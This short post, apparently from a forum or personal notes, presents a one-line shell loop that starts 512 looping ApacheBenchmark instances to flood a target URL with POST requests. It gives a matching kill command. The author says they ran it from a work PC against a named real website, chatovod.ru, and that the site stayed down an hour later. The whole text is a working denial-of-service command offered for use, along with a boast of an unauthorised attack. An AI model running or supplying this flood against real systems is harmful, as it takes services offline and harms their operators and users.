### As it turns out, ApacheBenchmark is more effective than all specialized DDoS scripts. I wrote a command to create multiple AB instances for the attack.
To start:	`for i in {1..512}; do (while true; do ab -n 4294967295 -c 100 -p <(echo "") -T application/x-www-form-urlencoded https://adress >/dev/null 2>&1; done) & done`
To stop:	`pkill -f "ab -n 4294967295"`.
### I tested this attack method on chatovod.ru, and an hour after the attack stopped, the site is still down, with the error `network request failed: Get "chatovod.ru": unsupported protocol scheme ""`. I needed 1024 threads, but the attack was successful without a VPS, I attacked from my work PC.
